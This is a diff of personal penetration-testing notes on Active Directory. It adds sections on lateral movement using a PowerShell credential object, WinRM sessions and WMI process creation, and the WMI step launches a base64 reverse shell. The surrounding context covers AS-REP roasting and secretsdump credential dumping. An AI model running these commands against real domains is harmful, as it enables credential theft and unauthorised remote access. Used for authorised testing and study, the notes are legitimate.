@@ -1,4 +1,6 @@
-## Active Directory
+# Active Directory
+
+## Compromising Credentials
 
 ### AS-REP Roasting
 If for some ridiculous reason the `Do not require Kerberos preauthentication` user setting is enabled, the door is open for querying for and receiving the users encrypted credentials, which we can then crack offline:
@@ -44,3 +46,31 @@ and via Linux:
 ```bash
 impacket-secretsdump -just-dc-user Administrator corp.com/powerfulUser:"rubbishPassw0rd\!"@192.168.12.34
 ```
+
+## Moving Laterally
+
+### Powershell Creds Block
+For both WinRM and WMI make use of the following to generate a `$credential` variable:
+```powershell
+$username = 'chump';
+$password = 'chumpsDogsName123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+```
+
+
+### WinRM
+Assuming you have credentials, the following will give us a Powershell session 
+```powershell
+New-PSSession -ComputerName 192.168.12.34 -Credential $credential
+Enter-PSsession 1
+```
+
+### WMI
+If for some reason we cannot use WinRM, or if we'd rather have a reverse shell from Kali, then worth trying WMI as an alternative:
+```powershell
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName 192.168.12.34 -Credential $credential -SessionOption $Options
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+The `$Command` variable used above that isn't explicitly defined anywhere should be a base64 encoded reverse shell written in Powershell as detailed in `notes/shells.md`
